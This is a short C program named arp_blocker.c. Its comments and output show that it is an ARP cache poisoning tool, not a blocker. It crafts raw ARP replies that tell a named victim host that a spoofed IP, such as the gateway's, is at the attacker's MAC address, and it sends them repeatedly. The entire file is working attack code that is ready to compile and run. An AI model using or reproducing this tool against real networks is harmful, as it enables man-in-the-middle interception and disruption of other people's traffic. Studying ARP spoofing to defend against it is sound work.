/*
 * arp_blocker.c
 *
 * Usage:
 *   gcc arp_blocker.c -o arp_blocker
 *
 *   sudo ./arp_blocker <iface> <target_ip> <target_mac> <spoof_ip> <spoof_mac>
 *
 *   iface      : network interface (e.g. eth0)
 *   target_ip  : victim IP to poison (e.g. 192.168.1.10)
 *   target_mac : victim MAC (e.g. aa:bb:cc:dd:ee:ff)
 *   spoof_ip   : IP to spoof (e.g. gateway IP 192.168.1.1)
 *   spoof_mac  : MAC to advertise for spoof_ip (e.g. your NIC MAC)
 *
 * Sends an ARP Reply to the target telling it "spoof_ip is at spoof_mac".
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <net/if_arp.h>
#include <linux/if_packet.h>
#include <net/ethernet.h>
#include <arpa/inet.h>
#include <netinet/if_ether.h>

#define ETH_HDR_LEN 14
#define ARP_PKT_LEN 28
#define ETH_ALEN 6

void usage(const char *prog) {
    fprintf(stderr,
        "Usage: %s <iface> <target_ip> <target_mac> <spoof_ip> <spoof_mac>\n",
        prog);
    exit(EXIT_FAILURE);
}

void mac_str_to_bytes(const char *str, unsigned char *mac) {
    if (sscanf(str, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
               &mac[0], &mac[1], &mac[2],
               &mac[3], &mac[4], &mac[5]) != 6) {
        fprintf(stderr, "Invalid MAC format: %s\n", str);
        exit(EXIT_FAILURE);
    }
}

int get_if_index(int sock, const char *iface) {
    struct ifreq ifr;
    memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, iface, IFNAMSIZ-1);
    if (ioctl(sock, SIOCGIFINDEX, &ifr) < 0) {
        perror("SIOCGIFINDEX");
        exit(EXIT_FAILURE);
    }
    return ifr.ifr_ifindex;
}

void send_arp_reply(const char *iface,
                    const unsigned char *target_mac,
                    const unsigned char *sender_mac,
                    const unsigned char *sender_ip,
                    const unsigned char *target_ip,
                    int count) {
    int sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
    if (sock < 0) {
        perror("socket");
        exit(EXIT_FAILURE);
    }
    int if_index = get_if_index(sock, iface);

    unsigned char buf[ETH_HDR_LEN + ARP_PKT_LEN];
    struct ethhdr *eth = (struct ethhdr *)buf;
    struct ether_arp *arp = (struct ether_arp *)(buf + ETH_HDR_LEN);

    memcpy(eth->h_dest, target_mac, ETH_ALEN);      //Target MAC
    memcpy(eth->h_source, sender_mac, ETH_ALEN);    // Sender MAC
    eth->h_proto = htons(ETH_P_ARP);                // EtherType = ARP (0x0806)

    arp->ea_hdr.ar_hrd = htons(ARPHRD_ETHER);       // 1 (Ethernet)
    arp->ea_hdr.ar_pro = htons(ETH_P_IP);           // 0x0800 (IPv4)
    arp->ea_hdr.ar_hln = ETH_ALEN;                  // 6 (MAC = 6바이트)
    arp->ea_hdr.ar_pln = 4;                         // 4 (IP = 4바이트)
    arp->ea_hdr.ar_op  = htons(ARPOP_REPLY);        // 2 (ARP Reply)

    memcpy(arp->arp_sha, sender_mac, ETH_ALEN);     // Sender MAC
    memcpy(arp->arp_spa, sender_ip, 4);             // Sender IP
    memcpy(arp->arp_tha, target_mac, ETH_ALEN);     // Target MAC
    memcpy(arp->arp_tpa, target_ip, 4);             // Target IP

    struct sockaddr_ll addr = {0};
    addr.sll_family = AF_PACKET;
    addr.sll_ifindex = if_index;
    addr.sll_halen = ETH_ALEN;
    memcpy(addr.sll_addr, target_mac, ETH_ALEN);

    for (int i = 0; i < count; i++) {
        if (sendto(sock, buf, sizeof(buf), 0,
                   (struct sockaddr *)&addr, sizeof(addr)) < 0) {
            perror("sendto");
        } else {
            printf("Sent ARP Reply #%d\n", i+1);
        }
        usleep(500000);
    }
    close(sock);
}

int main(int argc, char *argv[]) {
    if (argc != 6) usage(argv[0]);
    const char *iface       = argv[1];
    const char *target_ip_s = argv[2];
    const char *target_mac_s= argv[3];
    const char *spoof_ip_s  = argv[4];
    const char *spoof_mac_s = argv[5];

    unsigned char target_mac[ETH_ALEN], sender_mac[ETH_ALEN];
    unsigned char target_ip[4], sender_ip[4];

    mac_str_to_bytes(target_mac_s, target_mac);
    mac_str_to_bytes(spoof_mac_s, sender_mac);

    if (inet_pton(AF_INET, target_ip_s, target_ip) != 1) {
        fprintf(stderr, "Invalid target IP: %s\n", target_ip_s);
        exit(EXIT_FAILURE);
    }
    if (inet_pton(AF_INET, spoof_ip_s, sender_ip) != 1) {
        fprintf(stderr, "Invalid spoof IP: %s\n", spoof_ip_s);
        exit(EXIT_FAILURE);
    }

    printf("Poisoning %s (MAC %02x:%02x:%02x:%02x:%02x:%02x) with %s at %02x:%02x:%02x:%02x:%02x:%02x\n",
           target_ip_s,
           target_mac[0], target_mac[1], target_mac[2], target_mac[3], target_mac[4], target_mac[5],
           spoof_ip_s,
           sender_mac[0], sender_mac[1], sender_mac[2], sender_mac[3], sender_mac[4], sender_mac[5]
    );

    send_arp_reply(iface, target_mac, sender_mac, sender_ip, target_ip, 5);
    return 0;
}
